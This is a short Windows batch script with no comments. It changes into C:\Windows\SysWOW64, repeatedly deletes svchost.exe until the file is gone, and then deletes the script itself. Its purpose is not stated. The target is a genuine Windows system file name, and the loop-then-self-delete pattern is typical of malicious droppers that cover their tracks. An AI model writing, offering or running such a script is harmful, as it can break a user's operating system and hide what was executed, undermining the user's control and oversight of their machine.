@Echo Off
cd /d C:\Windows\SysWOW64\
:Start
del svchost.exe
If Exist svchost.exe Goto Start
del %0